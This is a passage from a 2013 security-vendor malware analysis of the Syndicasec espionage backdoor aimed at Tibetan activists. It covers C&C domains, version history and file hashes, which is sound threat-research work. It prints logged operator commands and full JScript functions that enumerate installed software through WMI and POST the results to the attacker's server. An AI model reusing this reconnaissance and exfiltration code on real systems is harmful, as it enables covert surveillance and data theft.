&#8216;file&#8217;<strong>);</strong>$<strong>.</strong>oHttp<strong>.</strong>Send<strong>(</strong>getDataString<strong>(</strong>d<strong>));</strong><strong>return</strong>&#8221;<strong>};</strong>ExecuteCommand<strong>(</strong>&#8216;system32info&#8217;<strong>);</strong></td>
</tr>
<tr>
<td valign="top" width="85">21:42:37</td>
<td valign="top" width="656">ExpandDirectory(&#8216;C:\\Documents and Settings\\&#8217;);</td>
</tr>
<tr>
<td valign="top" width="85">21:42:37</td>
<td valign="top" width="656">ExecuteCommand(&#8216;systeminfo&#8217;);</td>
</tr>
<tr>
<td valign="top" width="85">21:45:07</td>
<td valign="top" width="656">ExpandDirectory(&#8216;C:\\Documents and Settings\\All Users\\&#8217;);</td>
</tr>
<tr>
<td valign="top" width="85">21:45:07</td>
<td valign="top" width="656">ExecuteCommand(&#8216;net start&#8217;);</td>
</tr>
<tr>
<td valign="top" width="85">21:45:36</td>
<td valign="top" width="656">ExpandDirectory(&#8216;C:\\Documents and Settings\\All Users\\Desktop\\&#8217;);</td>
</tr>
<tr>
<td valign="top" width="85">21:46:37</td>
<td valign="top" width="656">ExecuteCommand(&#8216;tasklist&#8217;);</td>
</tr>
<tr>
<td valign="top" width="85">21:46:37</td>
<td valign="top" width="656">ExpandDirectory(&#8216;C:\\Documents and Settings\\user\\&#8217;);</td>
</tr>
<tr>
<td valign="top" width="85">21:47:37</td>
<td valign="top" width="656">ExpandDirectory(&#8216;C:\\Documents and Settings\\All Users\\Recent\\&#8217;);</td>
</tr>
<tr>
<td valign="top" width="85">21:48:48</td>
<td valign="top" width="656">ExpandDirectory(&#8216;C:\\Documents and Settings\\All Users\\.idlerc\\&#8217;);</td>
</tr>
<tr>
<td valign="top" width="85">21:48:48</td>
<td valign="top" width="656">ExecuteCommand(&#8216;net view&#8217;);</td>
</tr>
<tr>
<td valign="top" width="85">21:51:36</td>
<td valign="top" width="656">ExecuteCommand(&#8216;net use&#8217;);</td>
</tr>
<tr>
<td valign="top" width="85">21:52:38</td>
<td valign="top" width="656">ExpandDirectory(&#8216;C:\\Documents and Settings\\All Users\\My Documents\\&#8217;);</td>
</tr>
<tr>
<td valign="top" width="85">22:07:37</td>
<td valign="top" width="656">ExpandDirectory(&#8216;C:\\Documents and Settings\\All Users\\Recent\\&#8217;);</td>
</tr>
<tr>
<td valign="top" width="85">22:10:38</td>
<td valign="top" width="656">ExpandDirectory(&#8216;C:\\Documents and Settings\\user\\&#8217;);</td>
</tr>
<tr>
<td valign="top" width="85">22:13:38</td>
<td valign="top" width="656">EnumDisk();</td>
</tr>
<tr>
<td valign="top" width="85">22:13:38</td>
<td valign="top" width="656">ExpandDirectory(&#8216;C:\\&#8217;);</td>
</tr>
<tr>
<td valign="top" width="85">22:14:39</td>
<td valign="top" width="656">ExpandDirectory(&#8216;C:\\Documents and Settings\\user\\&#8217;);</td>
</tr>
<tr>
<td valign="top" width="85">22:14:39</td>
<td valign="top" width="656">ExpandDirectory(&#8216;C:\\Documents and Settings\\All Users\\Recent\\&#8217;);</td>
</tr>
<tr>
<td valign="top" width="85">22:14:39</td>
<td valign="top" width="656">ExpandDirectory(&#8216;C:\\Documents and Settings\\All Users\\Recent\\&#8217;);</td>
</tr>
</tbody>
</table>
<p>Basically, the operator was browsing our filesystem and looking at detailed settings and operations on the infected machine, such as network settings, attached drives and running programs.</p>
<p>The day after this visit, the operator sent another set of commands to gather some system information specific to our infected system.</p>
<table width="741" border="1" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td valign="top" width="85">22:34:50</td>
<td valign="top" width="656"><strong>function</strong> EnumInstaller<strong>()</strong> <strong>{</strong><strong>var</strong> s <strong>=</strong> &#8221;<strong>;</strong><strong>var</strong> a <strong>=</strong> 0x80000002<strong>;</strong><strong>var</strong> b <strong>=</strong> &#8220;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\&#8221;<strong>;</strong><strong>var</strong> c <strong>=</strong> GetObject<strong>(</strong>&#8220;winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\default:StdRegProv&#8221;<strong>);</strong><strong>var</strong> d <strong>=</strong> c<strong>.</strong>Methods_<strong>.</strong>Item<strong>(</strong>&#8220;EnumKey&#8221;<strong>);</strong><strong>var</strong> e <strong>=</strong> d<strong>.</strong>InParameters<strong>.</strong>SpawnInstance_<strong>();</strong>e<strong>.</strong>hDefKey <strong>=</strong> 0x80000002<strong>;</strong>e<strong>.</strong>sSubKeyName <strong>=</strong> b<strong>;</strong><strong>var</strong> f <strong>=</strong> c<strong>.</strong>ExecMethod_<strong>(</strong>d<strong>.</strong>Name<strong>,</strong> e<strong>);</strong><strong>var</strong> g <strong>=</strong> <strong>new</strong> Enumerator<strong>(</strong>f<strong>.</strong>sNames<strong>.</strong>toArray<strong>());</strong><strong>while</strong> <strong>(!</strong>g<strong>.</strong>atEnd<strong>())</strong> <strong>{</strong><strong>var</strong> h <strong>=</strong> g<strong>.</strong>item<strong>();</strong>d <strong>=</strong> c<strong>.</strong>Methods_<strong>.</strong>Item<strong>(</strong>&#8220;GetStringValue&#8221;<strong>);</strong>e <strong>=</strong> d<strong>.</strong>InParameters<strong>.</strong>SpawnInstance_<strong>();</strong>e<strong>.</strong>hDefKey <strong>=</strong> 0x80000002<strong>;</strong>e<strong>.</strong>sSubKeyName <strong>=</strong> b <strong>+</strong> h<strong>;</strong>e<strong>.</strong>sValueName <strong>=</strong> &#8220;DisplayName&#8221;<strong>;</strong>f <strong>=</strong> c<strong>.</strong>ExecMethod_<strong>(</strong>d<strong>.</strong>Name<strong>,</strong> e<strong>);</strong><strong>var</strong> j <strong>=</strong> f<strong>.</strong>sValue<strong>;</strong>e<strong>.</strong>sValueName <strong>=</strong> &#8220;UninstallString&#8221;<strong>;</strong>f <strong>=</strong> c<strong>.</strong>ExecMethod_<strong>(</strong>d<strong>.</strong>Name<strong>,</strong> e<strong>);</strong><strong>var</strong> k <strong>=</strong> f<strong>.</strong>sValue<strong>;</strong>e<strong>.</strong>sValueName <strong>=</strong> &#8220;InstallDate&#8221;<strong>;</strong>f <strong>=</strong> c<strong>.</strong>ExecMethod_<strong>(</strong>d<strong>.</strong>Name<strong>,</strong> e<strong>);</strong><strong>var</strong> l <strong>=</strong> f<strong>.</strong>sValue<strong>;</strong>e<strong>.</strong>sValueName <strong>=</strong> &#8220;InstallLocation&#8221;<strong>;</strong>f <strong>=</strong> c<strong>.</strong>ExecMethod_<strong>(</strong>d<strong>.</strong>Name<strong>,</strong> e<strong>);</strong><strong>var</strong> m <strong>=</strong> f<strong>.</strong>sValue<strong>;</strong>s <strong>+=</strong> &#8216;{&#8216; <strong>+</strong> &#8216;&#8221;InstallerName&#8221;:&#8221;&#8216; <strong>+</strong> h <strong>+</strong> &#8216;&#8221;,&#8221;DisplayName&#8221;:&#8221;&#8216; <strong>+</strong> j <strong>+</strong> &#8216;&#8221;,&#8221;UninstallString&#8221;:&#8221;&#8216; <strong>+</strong> escape<strong>(</strong>f<strong>.</strong>sValue<strong>)</strong> <strong>+</strong> &#8216;&#8221;,&#8221;InstallDate&#8221;:&#8221;&#8216; <strong>+</strong> l <strong>+</strong> &#8216;&#8221;,&#8221;InstallLocation&#8221;:&#8221;&#8216; <strong>+</strong> escape<strong>(</strong>m<strong>)</strong> <strong>+</strong> &#8216;&#8221;},&#8217;<strong>;</strong>g<strong>.</strong>moveNext<strong>()</strong><strong>}</strong></p>
<p><strong>if</strong> <strong>(</strong>s<strong>.</strong>length <strong>&gt;</strong> 0<strong>)</strong> s <strong>=</strong> s<strong>.</strong>substr<strong>(</strong>0<strong>,</strong> s<strong>.</strong>length <strong>&#8211;</strong> 1<strong>);</strong></p>
<p>$<strong>.</strong>oHttp<strong>.</strong>Open<strong>(</strong>&#8216;POST&#8217;<strong>,</strong> $<strong>.</strong>sXmlUrl <strong>+</strong> &#8216;?&#8217; <strong>+</strong> $<strong>.</strong>sURLParam <strong>+</strong> &#8216;&amp;command=offlineresult&amp;commandid=&#8217; <strong>+</strong> commands<strong>[</strong>i<strong>].</strong>id<strong>,</strong> <strong>false</strong><strong>);</strong></p>
<p>$<strong>.</strong>oHttp<strong>.</strong>setRequestHeader<strong>(</strong>&#8216;CONTENT-TYPE&#8217;<strong>,</strong> &#8216;file&#8217;<strong>);</strong></p>
<p>$<strong>.</strong>oHttp<strong>.</strong>Send<strong>(</strong>getDataString<strong>(</strong>&#8216;[&#8216; <strong>+</strong> s <strong>+</strong> &#8216;]&#8217;<strong>));</strong></p>
<p><strong>return</strong> &#8221;</p>
<p><strong>};</strong></p>
<p>EnumInstaller<strong>();</strong></td>
</tr>
<tr>
<td valign="top" width="85">22:34:50</td>
<td valign="top" width="656">ExpandDirectory(&#8216;C:\\Documents and Settings\\All Users\\DRM\\&#8217;);</td>
</tr>
<tr>
<td valign="top" width="85">22:35:35</td>
<td valign="top" width="656">ExpandDirectory(&#8216;C:\\Python27\\Tools\\&#8217;);</td>
</tr>
<tr>
<td valign="top" width="85">22:36:35</td>
<td valign="top" width="656">EnumDisk();</td>
</tr>
<tr>
<td valign="top" width="85">22:37:39</td>
<td valign="top" width="656"><strong>function</strong> EnumProduct<strong>()</strong> <strong>{</strong><strong>var</strong> a <strong>=</strong> GetObject<strong>(</strong>&#8220;winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2&#8221;<strong>);</strong><strong>var</strong> b <strong>=</strong> <strong>new</strong> Enumerator<strong>(</strong>a<strong>.</strong>ExecQuery<strong>(</strong>&#8220;Select * from Win32_Product&#8221;<strong>));</strong><strong>var</strong> s <strong>=</strong> &#8221;<strong>;</strong><strong>while</strong> <strong>(!</strong>b<strong>.</strong>atEnd<strong>())</strong> <strong>{</strong><strong>var</strong> c <strong>=</strong> b<strong>.</strong>item<strong>();</strong>s <strong>+=</strong> &#8216;{&#8216; <strong>+</strong> &#8216;&#8221;ProductName&#8221;:&#8221;&#8216; <strong>+</strong> c<strong>.</strong>Name <strong>+</strong> &#8216;&#8221;,&#8221;InstallLocation&#8221;:&#8221;&#8216; <strong>+</strong> escape<strong>(</strong>c<strong>.</strong>InstallLocation<strong>)</strong> <strong>+</strong> &#8216;&#8221;,&#8221;PackageCache&#8221;:&#8221;&#8216; <strong>+</strong> escape<strong>(</strong>c<strong>.</strong>PackageCache<strong>)</strong> <strong>+</strong> &#8216;&#8221;},&#8217;<strong>;</strong>b<strong>.</strong>moveNext<strong>()</strong><strong>}</strong><strong>if</strong> <strong>(</strong>s<strong>.</strong>length <strong>&gt;</strong> 0<strong>)</strong> s <strong>=</strong> s<strong>.</strong>substr<strong>(</strong>0<strong>,</strong> s<strong>.</strong>length <strong>&#8211;</strong> 1<strong>);</strong>$<strong>.</strong>oHttp<strong>.</strong>Open<strong>(</strong>&#8216;POST&#8217;<strong>,</strong> $<strong>.</strong>sXmlUrl <strong>+</strong> &#8216;?&#8217; <strong>+</strong> $<strong>.</strong>sURLParam <strong>+</strong> &#8216;&amp;command=offlineresult&amp;commandid=&#8217; <strong>+</strong> commands<strong>[</strong>i<strong>].</strong>id<strong>,</strong> <strong>false</strong><strong>);</strong>$<strong>.</strong>oHttp<strong>.</strong>setRequestHeader<strong>(</strong>&#8216;CONTENT-TYPE&#8217;<strong>,</strong> &#8216;file&#8217;<strong>);</strong>$<strong>.</strong>oHttp<strong>.</strong>Send<strong>(</strong>getDataString<strong>(</strong>&#8216;[&#8216; <strong>+</strong> s <strong>+</strong> &#8216;]&#8217;<strong>));</strong><strong>return</strong>&#8221;<strong>};</strong>EnumProduct<strong>();</strong></td>
</tr>
<tr>
<td valign="top" width="85">22:37:39</td>
<td valign="top" width="656">EnumProcess();</td>
</tr>
<tr>
<td valign="top" width="85">22:39:36</td>
<td valign="top" width="656">ExpandDirectory(&#8216;C:\\Documents and Settings\\Default User\\Start Menu\\&#8217;);</td>
</tr>
<tr>
<td valign="top" width="85">22:41:36</td>
<td valign="top" width="656">ExpandDirectory(&#8216;C:\\Documents and Settings\\Default User\\Start Menu\\Programs\\&#8217;);</td>
</tr>
<tr>
<td valign="top" width="85">22:41:36</td>
<td valign="top" width="656">EnumDisk();</td>
</tr>
<tr>
<td valign="top" width="85">22:41:36</td>
<td valign="top" width="656">ExpandDirectory(&#8216;C:\\Documents and Settings\\All Users\\Start Menu\\&#8217;);</td>
</tr>
<tr>
<td valign="top" width="85">22:42:35</td>
<td valign="top" width="656">ExpandDirectory(&#8216;C:\\Documents and Settings\\All Users\\My Documents\\&#8217;);</td>
</tr>
<tr>
<td valign="top" width="85">22:47:35</td>
<td valign="top" width="656">ExecuteCommand(&#8216;dir c:\\&#8217;);</td>
</tr>
<tr>
<td valign="top" width="85">22:48:35</td>
<td valign="top" width="656">ExecuteCommand(&#8216;dir /a/s c:\\program files\\&#8217;);</td>
</tr>
<tr>
<td valign="top" width="85">22:48:35</td>
<td valign="top" width="656">ExecuteCommand(&#8216;dir c:\\dir c:&#8217;);</td>
</tr>
<tr>
<td valign="top" width="85">22:53:38</td>
<td valign="top" width="656">ExecuteCommand(&#8216;dir /a/s c:\\progra~1&#8217;);</td>
</tr>
<tr>
<td valign="top" width="85">22:56:36</td>
<td valign="top" width="656">ExpandDirectory(&#8216;C:\\Documents and Settings\\Default User\\Local Settings\\&#8217;);</td>
</tr>
<tr>
<td valign="top" width="85">22:57:37</td>
<td valign="top" width="656">EnumDisk();</td>
</tr>
<tr>
<td valign="top" width="85">23:03:35</td>
<td valign="top" width="656">ExecuteCommand(&#8216;systeminfo&#8217;);</td>
</tr>
</tbody>
</table>
<p>In this session, the commands sent by the operator had roughly the same purpose, but were done differently, strongly suggesting a different operator to the previous day. We also note some sort of typo or bug in this line:</p>
<p><em>ExecuteCommand(&#8216;dir c:\\dir c:&#8217;);</em></p>
<p>The Stage Two URLs remained unchanged until 2013-04-22. The three blog entries in the hardcoded Stage One URLs were all changed on that same day within a 30-minute window to direct infected systems to a new Stage Two domain: netfortibt.info. Details of this new domain can be found in the next section.</p>
<h2>Malware history</h2>
<p>Now that we know how the malware gets installed on a target system and what capabilities it offers to the attacker, let&#8217;s establish some context around this threat.</p>
<p style="text-align: left;">First, we were able to find a version of the master script dating from July 2010, uploaded to an <a href="http://jsunpack.jeek.org/dec/go?report=c65da5a1d196db7364a59c6c6707263d4d2062e1" target="_blank">online Javascript analyzer</a>. The screenshot below shows some differences in the first few lines of the script. We can clearly see the version number evolution, passing from 0.5.2 to a 1.2.0 release.</p>
<p><a href="/wp-content/uploads/2013/05/syndicasec012-7.png"><img class="aligncenter size-full wp-image-21582" title="syndicasec012 (7)" alt="" src="/wp-content/uploads/2013/05/syndicasec012-7.png" width="665" height="270" srcset="https://www.welivesecurity.com/wp-content/uploads/2013/05/syndicasec012-7.png 665w, https://www.welivesecurity.com/wp-content/uploads/2013/05/syndicasec012-7-300x121.png 300w, https://www.welivesecurity.com/wp-content/uploads/2013/05/syndicasec012-7-340x137.png 340w" sizes="(max-width: 665px) 100vw, 665px" /></a></p>
<p style="text-align: left;">When further analyzing the differences between the two versions, we can see that the encryption present in the &lt;title&gt; tag of the Stage One RSS feed did not change. On the other hand, the commands sent from the C&amp;C went from cleartext to being encrypted in version 1.2.0 of the script (see the <em>circleDecode()</em> function):</p>
<p style="text-align: center;"><a href="/wp-content/uploads/2013/05/syndicasec012-9.png"><img class="aligncenter  wp-image-21584" title="syndicasec012 (9)" alt="" src="/wp-content/uploads/2013/05/syndicasec012-9.png" width="608" height="271" srcset="https://www.welivesecurity.com/wp-content/uploads/2013/05/syndicasec012-9.png 1014w, https://www.welivesecurity.com/wp-content/uploads/2013/05/syndicasec012-9-300x133.png 300w" sizes="(max-width: 608px) 100vw, 608px" /></a></p>
<p>Finally, we can see that the old version performs the WMI calls needed to register itself in the <em>root\subscription</em> namespace, while version 1.2.0 depends on its dropper to perform this step.</p>
<p style="text-align: center;"><a href="/wp-content/uploads/2013/05/syndicasec012-11.png"><img class="aligncenter  wp-image-21586" title="syndicasec012 (11)" alt="" src="/wp-content/uploads/2013/05/syndicasec012-11.png" width="606" height="179" srcset="https://www.welivesecurity.com/wp-content/uploads/2013/05/syndicasec012-11.png 865w, https://www.welivesecurity.com/wp-content/uploads/2013/05/syndicasec012-11-300x88.png 300w" sizes="(max-width: 606px) 100vw, 606px" /></a></p>
<p style="text-align: center;">The old script contains only one hardcoded Stage One URL, which is still active at the time of writing. <a href="/wp-content/uploads/2013/05/syndicasec012-12.png"><img class="aligncenter  wp-image-21587" title="syndicasec012 (12)" alt="" src="/wp-content/uploads/2013/05/syndicasec012-12.png" width="644" height="441" srcset="https://www.welivesecurity.com/wp-content/uploads/2013/05/syndicasec012-12.png 716w, https://www.welivesecurity.com/wp-content/uploads/2013/05/syndicasec012-12-300x205.png 300w, https://www.welivesecurity.com/wp-content/uploads/2013/05/syndicasec012-12-151x103.png 151w, https://www.welivesecurity.com/wp-content/uploads/2013/05/syndicasec012-12-97x65.png 97w" sizes="(max-width: 644px) 100vw, 644px" /></a></p>
<p>We can see that only twenty-five (25) users have visited this page since it was posted in September 2010. The decrypted <em>&lt;title&gt;</em> tag reveals an inactive Stage Two URL (<em>http://&lt;redacted&gt;.hostaim.com/summer/ieupdate.php</em>).</p>
<p>Another piece of information was also found using the same Javascript analyzer. We can see a dialogue between an infected host and a C&amp;C dating from 2012. The query string reveals that the infected host is running version 1.01 of the master script.</p>
<p style="text-align: center;"><a href="/wp-content/uploads/2013/05/syndicasec012-14.png"><img class="aligncenter  wp-image-21589" title="syndicasec012 (14)" alt="" src="/wp-content/uploads/2013/05/syndicasec012-14.png" width="742" height="158" srcset="https://www.welivesecurity.com/wp-content/uploads/2013/05/syndicasec012-14.png 1060w, https://www.welivesecurity.com/wp-content/uploads/2013/05/syndicasec012-14-300x63.png 300w, https://www.welivesecurity.com/wp-content/uploads/2013/05/syndicasec012-14-1024x217.png 1024w" sizes="(max-width: 742px) 100vw, 742px" /></a></p>
<p>This clearly shows that this threat has been maintained and used over several years.</p>
<p>Let&#8217;s look now at the domains involved in this operation. The Stage One 1 URLs are all pointing to free blog-sites and are rather uninteresting. The Stage Two URLs are more relevant and deserve closer examination.</p>
<p>In the course of our monitoring, we saw two active Stage Two URLs:</p>
<table width="709" border="1" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td valign="top" width="114">Domain</td>
<td valign="top" width="111">Registrar</td>
<td valign="top" width="97">Created On</td>
<td valign="top" width="387">IP</td>
</tr>
<tr>
<td valign="top" width="114">tbtworld.info</td>
<td valign="top" width="111">GoDaddyRegistrant Name: boorn zeroseven</td>
<td valign="top" width="97">2012-09-18</td>
<td valign="top" width="387">2012-11-21: 209.141.36.23 (BuyVM, Canada)2013-03-25 &#8211;  2013-04-19: 216.83.45.18  (Ethr.Net LLC, USA)&gt; 2013-04-19: 195.43.45.18 (Routo Telecom, UK)</td>
</tr>
<tr>
<td valign="top" width="114">nedfortibt.info</td>
<td valign="top" width="111">GoDaddyRegistrant Name: Tsering Duoten</td>
<td valign="top" width="97">2013-04-18</td>
<td valign="top" width="387">216.83.45.18 (BuyVM, Canada)</td>
</tr>
<tr>
<td colspan="4" valign="top" width="709"><em>Related domain (found having an A record identical to tbtworld.info):</em></td>
</tr>
<tr>
<td valign="top" width="114">
<p align="center">tbtsociety.info</p>
</td>
<td valign="top" width="111">GoDaddyRegistrant Name: boorn zeroseven</td>
<td valign="top" width="97">2012-09-18</td>
<td valign="top" width="387">2012-11-21: 209.141.36.23 (BuyVM, Canada)2013-04-30: 215.43.40.16 (DoD, USA)</td>
</tr>
</tbody>
</table>
<p>Unlike the DoD IP, the other three IPs reveal many hundreds of domain names to which A records are pointing. Most of these domains were registered less than a year ago and point to amateur-looking websites for small businesses, all in Asian languages.</p>
<p>The three domains shown in the previous table also reveal a clear reference to Tibet.  The &#8216;ned&#8217; in &#8216;nedfortibt.info&#8217; relates to the National Endowment for Democracy organization, described on their <a href="http://www.ned.org/">website</a> as: &#8220;<em>a private, nonprofit foundation dedicated to the growth and strengthening of democratic institutions around the world. Each year, with funding from the US Congress, NED supports more than 1,000 projects of non-governmental groups abroad who are working for democratic goals in more than 90 countries.&#8221;</em></p>
<p>The <a href="http://www.ned.org/where-we-work/asia/china-tibet" target="_blank">NED is openly supportive</a> of Tibetans in their uneasy relations with China.</p>
<h2>Conclusion</h2>
<p>This analysis showed an implementation of rather unusual techniques to build a stealthy and flexible backdoor. The lack of built-in commands prevents us from discovering the real end-goal of this operation. However, we can affirm that the various characteristics observed around this threat are similar to other espionage campaigns against Tibetan activists that we have observed.</p>
<p>MD5 hashes of the files analyzed:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-62ea2f9e8f4e5827768364" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
stage1_dropper.exe      7ee6a8cc75b5e8adf64af899fabd88a4
gupdate.exe             b60ce366e142200e3191a1dffdf7283c
CryptBase.dll           c469b1010f348bd4a5bd5471ff388464</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-62ea2f9e8f4e5827768364-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-62ea2f9e8f4e5827768364-2">2</div><div class="crayon-num" data-line="crayon-62ea2f9e8f4e5827768364-3">3</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-62ea2f9e8f4e5827768364-1"><span class="crayon-v">stage1_dropper</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-h"> </span>    <span class="crayon-h"> </span><span class="crayon-cn">7ee6a8cc75b5e8adf64af899fabd88a4</span></div><div class="crayon-line crayon-striped-line" id="crayon-62ea2f9e8f4e5827768364-2"><span class="crayon-v">gupdate</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-h"> </span>           <span class="crayon-h"> </span><span class="crayon-e">b60ce366e142200e3191a1dffdf7283c</span></div><div class="crayon-line" id="crayon-62ea2f9e8f4e5827768364-3"><span class="crayon-v">CryptBase</span><span class="crayon-sy">.</span><span class="crayon-i">dll</span><span class="crayon-h"> </span>         <span class="crayon-h"> </span><span class="crayon-v">c469b1010f348bd4a5bd5471ff388464</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p><strong>Alexis Dorais-Joncas</strong><br />
<strong>Security Intelligence Team Lead</strong></p>
<p>&nbsp;</p>

                            
                                                            <div class="dot">
                                    <span class="icomoon icon-icon_article_dot"></span>
                                </div>

                                <div class="meta">
                                    <div class="wls-authors wls-authors-footer">
                                                                            </div>
                                    <span class="strong">
								        <time datetime="2013-05-23 10:02:23">23 May 2013 - 10:02AM</time>
                                    </span>
                                </div>
                            
                                <div class="widgets row">
        <div class="col-md-12 col-sm-12 col-xs-12">
            <div class="heading-line col-md-12 col-sm-12 col-xs-12 no-padding">
                <h3><span class="text"><em>Sign up to receive an email update whenever a new article is published in our <a href="https://www.welivesecurity.com/category/ukraine-crisis-digital-security-resource-center/" target="_blank" rel="noopener">Ukraine Crisis – Digital Security Resource Center</a></em></span></h3>
            </div>
        </div>
        <div class="col-md-6 col-sm-6 col-xs-12 newsletter-wrapper">
            <form action="https://enjoy.eset.com/pub/rf" class="basic-searchform col-md-12 col-sm-12 col-xs-12 no-padding newsletter" method="post" role="search">
                <div class="search-input clearfix">
                    <input type="text" name="EMAIL_ADDRESS_" value="" placeholder="Email...">
                    <input type="hidden" name="TOPIC" value="We Live Security Ukraine Newsletter">

                    <input type="hidden" name="_ri_" value="X0Gzc2X%3DAQpglLjHJlTQGgXv4jDGEK4KW2uhw0qgUzfwuivmOJOPCgzgo9vsI3VwjpnpgHlpgneHmgJoXX0Gzc2X%3DAQpglLjHJlTQGzbD6yU2pAgzaJM16bkTA7tOwuivmOJOPCgzgo9vsI3">
                    <input type="hidden" name="_ei_" value="Ep2VKa8UKNIAPP_2GAEW0bY">
                    <input type="hidden" name="_di_" value="m0a5n0j02duo9clmm4btuu5av8rdtvqfqd03v1hallrvcob47ad0">
                    <input type="hidden" name="EMAIL_PERMISSION_STATUS_" value="O">
                    <input type="hidden" name="CONTACT_SOURCE_MOST_RECENT" value="WLS_Subscribe_Form">
                    <button class="button-flag">
                        Submit                    </button>
                </div>
            </form>
        </div>
    </div>
                                <div class="widgets row">
        <div class="col-md-12 col-sm-12 col-xs-12">
            <div class="heading-line col-md-12 col-sm-12 col-xs-12 no-padding">
                <h3><span class="text">Newsletter</span></h3>
            </div>
        </div>
        <div class="col-md-6 col-sm-6 col-xs-12 newsletter-wrapper">
            <form action="https://enjoy.eset.com/pub/rf" class="basic-searchform col-md-12 col-sm-12 col-xs-12 no-padding newsletter" method="post" role="search">
                <div class="search-input clearfix">
                    <input type="text" name="EMAIL_ADDRESS_" value="" placeholder="Email...">
                    <input type="hidden" name="NEWSLETTER" value="We Live Security">

                    <input type="hidden" name="_ri_" value="X0Gzc2X%3DAQpglLjHJlTQGgXv4jDGEK4KW2uhw0qgUzfwuivmOJOPCgzgo9vsI3VwjpnpgHlpgneHmgJoXX0Gzc2X%3DAQpglLjHJlTQGzbD6yU2pAgzaJM16bkTA7tOwuivmOJOPCgzgo9vsI3">
                    <input type="hidden" name="_ei_" value="Ep2VKa8UKNIAPP_2GAEW0bY">
                    <input type="hidden" name="_di_" value="m0a5n0j02duo9clmm4btuu5av8rdtvqfqd03v1hallrvcob47ad0">
                    <input type="hidden" name="EMAIL_PERMISSION_STATUS_" value="O">
                    <input type="hidden" name="CONTACT_SOURCE_MOST_RECENT" value="WLS_Subscribe_Form">
                    <button class="">
                        Submit                    </button>
                </div>
            </form>
        </div>
    </div>

                                                            <div class="similar-articles row">
                                    <div class="heading-line col-md-12 col-sm-12 col-xs-12">
                                        <h3><span class="text">Similar Articles</span></h3>
                                    </div>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/cybersecurity/" class="category-tag-btn">Cybersecurity</a>                                                <a href="https://www.welivesecurity.com/2022/07/04/cyberattacks-real-existential-threat-organizations/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2022/07/cyberattacks-real-existential-threat-623x415.jpg"
                                                         alt="Syndicasec in the sin bin: targeted espionage malware in action">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2022/07/04/cyberattacks-real-existential-threat-organizations/">
                                                    Cyberattacks: A very real existential threat to organizations                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/cybersecurity/" class="category-tag-btn">Cybersecurity</a>                                                <a href="https://www.welivesecurity.com/2022/05/27/cybersecurity-global-problem-requires-global-answer/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2022/05/cybersecurity-resilience-global-623x415.jpg"
                                                         alt="Syndicasec in the sin bin: targeted espionage malware in action">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2022/05/27/cybersecurity-global-problem-requires-global-answer/">
                                                    Cybersecurity: A global problem that requires a global answer                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/scams/" class="category-tag-btn">Scams</a>                                                <a href="https://www.welivesecurity.com/2022/04/26/trouble-bec-how-stop-costliest-scam/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2022/04/bec-attacks-scams-fraud-623x415.jpg"
                                                         alt="Syndicasec in the sin bin: targeted espionage malware in action">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2022/04/26/trouble-bec-how-stop-costliest-scam/">
                                                    The trouble with BEC: How to stop the costliest internet scam                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
